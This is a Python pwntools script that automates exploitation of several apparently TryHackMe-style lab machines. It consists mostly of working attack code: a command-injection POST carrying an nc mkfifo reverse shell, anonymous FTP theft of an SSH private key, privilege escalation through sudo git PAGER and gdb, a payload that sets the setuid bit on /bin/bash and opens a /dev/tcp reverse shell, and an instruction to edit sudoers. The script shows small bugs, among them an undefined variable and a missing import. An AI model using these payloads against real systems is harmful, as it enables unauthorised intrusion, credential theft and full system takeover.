from pwn import *
import requests
import os
import ftplib
import base64
import json

# machineName = input("Enter Machine Name: ")
sess = requests.session()

# -------------------------------------------------- Tyler -------------------------------------------------- #
def Tyler():
    global sess
    ip = input("Enter Machine Ip: ")
    response = os.system(f"ping -c 1 {ip} > /dev/null")
    if response == 0:
        print('[*] Host is up')
    else:
        print('[!] Host is down, Check Your Ip Or Vpn')
        exit()
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

    postData = {
        "user" : f'1;{payload}',
        "submit" : 'Submit+Query'
    }
    print("[*] Sending Payload")
    try:
        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
        if(shell.status_code == 200):
            print("[*] Payload Sent")
            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
            print("[*] Then do whatever you want")
        else:
            print("[!] Payload Failed")
            exit()
    except:
        print("[!] Connection Failed")
        exit()

# -------------------------------------------------- Production -------------------------------------------------- #
def Production():
    print("Please Add Machine Ip To Your '/etc/hosts'")
    input("[*] Press Enter To Continue")
    username = "anonymous"
    password = "anonymous"
    filenames = [
            "flag.txt",
            "id_rsa"
    ]
    ftp_server = ftplib.FTP('production.thm', username, password)
    ftp_server.encoding = 'utf-8'
    for filenames in filenames:
        with open(filenames, "wb") as f:
            ftp_server.retrbinary(f"RETR {filenames}", f.write)
        file = open("flag.txt", "r")
    ftp_server.quit()
    os.system("cat id_rsa > key")
    req = ssh(host='production.thm', user='ashu', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"sudo su skidy")
    shell.sendline(b"")
    time.sleep(1)
    shell.sendline(b"""sudo PAGER='sh -c "exec sh 0<&1"' git -p help""")
    time.sleep(1)
    shell.interactive()
    
# -------------------------------------------------- Shrek -------------------------------------------------- #
def Shrek():
    ip = input("Enter Machine Ip: ")
    os.system(f"wget {ip}/Cpxtpt2hWCee9VFa.txt 2>/dev/null; mv Cpxtpt2hWCee9VFa.txt key; chmod 600 key")
    req = ssh(host=ip, user='shrek', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"""gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit""")
    shell.sendline(b"")
    time.sleep(1)
    shell.interactive()
# -------------------------------------------------- H1 - Easy -------------------------------------------------- #

def H1():
    global sess
    userIp = input("Enter Your Ip: ")
    port = input("Enter Listening Port: ")
    payload = f"""exec("echo 'chmod 4777 /bin/bash' >> /home/serv3/backups/backup.sh;/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");"""
    data = {
        "code" : payload
    }
    print("[*] Sending Payload")
    print("[*] Root Command: >$ '/bin/bash -p'")
    shell = sess.post(f"http://{ip}:8002/trycode", data=data)
    if(shell.status_code == 200):
        print("[*] Check Your Listener")
    else:
        print("[!] Server Error")
        exit()
        

if __name__ == "__main__":
    Production()
    # if machineName == "Tyler" or machineName == "tyler":
    #     Tyler()
    # if machineName == "Production" or machineName == "production":
    #     Production()
    # if machineName == "Shrek" or machineName == "shrek":
    #     Shrek()
    # else:
    #     print("[!] Invalid Machine Name")
    #     exit()
